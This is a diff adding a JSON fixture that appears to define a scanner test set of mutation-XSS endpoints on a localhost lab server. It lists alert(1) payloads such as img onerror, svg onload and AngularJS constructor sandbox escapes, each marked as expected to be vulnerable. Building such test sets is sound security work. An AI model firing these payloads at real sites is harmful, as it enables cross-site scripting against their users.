@@ -1,0 +1,59 @@
+{
+  "_meta": {
+    "category": "Mutation",
+    "description": "Mutation XSS endpoints — payloads transform through browser parsing (mXSS)",
+    "target": "http://localhost:9090"
+  },
+  "endpoints": [
+    {
+      "name": "mutation-innerhtml",
+      "category": "Mutation",
+      "url": "http://localhost:9090/mutation/innerhtml",
+      "method": "GET",
+      "params": ["html"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "html", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "html", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "mutation-angular",
+      "category": "Mutation",
+      "url": "http://localhost:9090/mutation/angular",
+      "method": "GET",
+      "params": ["expr"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "{{constructor.constructor('alert(1)')()}}", "target_param": "expr", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "{{$on.constructor('alert(1)')()}}", "target_param": "expr", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "mutation-svg",
+      "category": "Mutation",
+      "url": "http://localhost:9090/mutation/svg",
+      "method": "GET",
+      "params": ["data"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<svg onload=alert(1)>", "target_param": "data", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "mutation-dangerouslyhtml",
+      "category": "Mutation",
+      "url": "http://localhost:9090/mutation/dangerouslyhtml",
+      "method": "GET",
+      "params": ["content"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "content", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
